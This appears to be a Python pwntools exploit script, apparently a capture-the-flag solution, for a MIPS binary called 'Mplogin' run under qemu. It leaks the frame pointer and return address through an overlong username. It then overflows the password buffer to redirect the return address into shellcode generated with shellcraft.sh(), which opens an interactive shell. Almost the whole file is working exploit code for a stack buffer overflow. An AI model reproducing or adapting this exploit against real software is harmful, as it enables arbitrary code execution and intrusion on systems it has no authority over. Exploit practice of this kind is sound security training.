from typing import Tuple
from pwn import *

# 两个函数都有问，从第一个函数 print addr，

context(arch='mips', os='linux', endian = 'little', log_level = 'debug') 

fileName = './Mplogin'
p = process(['qemu-mipsel', '-L', './', '-g', '1236', './Mplogin'])
context.log_level = 'debug'

userName = b'admin'

prePassword =  b'access'
password = b'01234567890'

passBufSize = 36
prePassSize = 20

loginSize = 24

def expLogin(paylaod: bytearray) -> Tuple[int, int]:
    p.recvuntil(b'Username : ')

    payload = userName.ljust(loginSize, b'A')
    p.send(payload)
    p.recvuntil(b'name : ')

    reply = p.recvuntil(b'\x1B[31m', drop = True)
    print(len(reply))
    fp, ra = reply[loginSize:][:4], reply[loginSize + 4:][:4]
    ra = ra.ljust(4, b'\x00')

    assert len(fp) == len(ra) == 4, ra
    fp, ra = map(u32, [fp, ra])

    return fp, ra


def expPassword(retAddr: int):
    namelen = 31
    namelen4 = namelen + 4

    # stack looks like: L -> H: fp, ra
    # send access_
    p.recvuntil(b"Pre_Password : ")
    shellcode = asm(shellcraft.sh())
    payload = b'0123456789'.ljust(36) + b'BBBB' + p32(retAddr) + shellcode
    p.sendline(b'access'.ljust(prePassSize, b'A') + p32(len(payload)))
    p.recvuntil(b"Password : ")
    p.sendline(payload)


fp, ra = expLogin(None)
print("fp = ", hex(fp))
expPassword(fp - 0xd90 + 0xd64 + 36 +4 +4 )

p.interactive()